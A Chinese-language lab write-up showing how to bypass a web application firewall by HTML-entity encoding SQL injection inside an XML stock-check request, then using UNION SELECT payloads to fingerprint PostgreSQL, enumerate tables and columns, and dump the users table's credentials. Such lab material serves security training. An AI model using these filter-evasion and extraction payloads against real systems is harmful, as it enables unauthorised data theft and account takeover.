# 实验：通过 XML 编码绕过过滤器的 SQL 注入

本实验在其库存检查（stock check）功能中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。

数据库包含一个 `users` 表，其中存储了注册用户的用户名和密码。为了解决本实验，请执行 SQL 注入攻击以检索管理员用户的凭据，然后登录其账户。

> **提示**
> Web 应用防火墙（WAF）会阻止包含明显 SQL 注入攻击特征的请求。你需要找到一种方法来混淆你的恶意查询以绕过此过滤器。我们建议使用 Hackvertor 扩展来实现这一点。

## 步骤

探测
- 使用库存检索功能
    ```http
    POST /product/stock HTTP/2

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
    ```
    - 服务器响应
        `174 units`

- 预计为数字型端点，测试数字表达式 `3-2`
    ```xml
    <productId>
    3-2
    </productId>
    ```

    - 服务器响应与 id `1` 相同
        `174 units`
    
    - 确认数字型 SQLi

- 尝试注释符
    `1 --`

    - 服务器响应
        `"Attack detected"` 
    
    - 存在注入防御

- 尝试 HTML 编码
    ```xml
    <productId>
        1<@html_entities>
            --
        </@html_entities>
    </productId>
    ```

    - 服务器响应
        ```log
        174 units
        493 units
        257 units
        ```
    - 未报错且返回商品对应的3个地区库存信息

    - 猜测查询语句
        ```sql
        SELECT x FROM x WHERE productId=$productId AND storeId=$storeId
        ```

测试
- 尝试注入 UNION SELECT 子句
    ```xml
    <productId>
        1<@html_entities>
            UNION SELECT 'abc' --
        </@html_entities>
    </productId>
    ```
    - 成功
- 尝试注入不存在的 ID 或 false 条件
    ```sql
    -1 UNION SELECT 'abc' -- 
    1 AND 1=2 UNION SELECT 'abc' -- 
    ```
    - 均成功得到仅包含伪造查询的干净输出
        `abc`

此时数据库版本未知
- 尝试联合查询读取版本
    ```sql
    -1 UNION SELECT version() -- 
    ```
    - 服务器响应
        ```log
        PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
        ```
        - 得到数据库信息

- 枚举数据库
    ```sql
    AND 1=2 UNION SELECT schema_name FROM information_schema.schemata --
    ```
    - 服务器响应
        ```log
        information_schema
        public
        pg_catalog
        ```
    - 关注其中的非系统数据库 public

- 枚举数据库 public 的表
    ```sql
    AND 1=2 UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'-- 
    ```
    - 服务器响应
        ```log
        users
        stock_level
        products
        ```
    - 关注其中的表 users

- 枚举表 users 的列

    ```sql
    AND 1=2 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- 
    ```
    - 服务器响应
        ```log
        email
        password
        username
        ```
- 从表 users 中提取字段 username、password

    ```sql
    AND 1=2 UNION SELECT STRING_AGG(username || ' : ' || password, ' , ') FROM users -- 
    ```

    - 服务器响应
        ```log
        administrator : uwbjiuz9rj38m395lw3e , wiener : 7y8ieqqa0xr4jm2st1xa , carlos : jrq667nut7ajw749t4gq
        ```
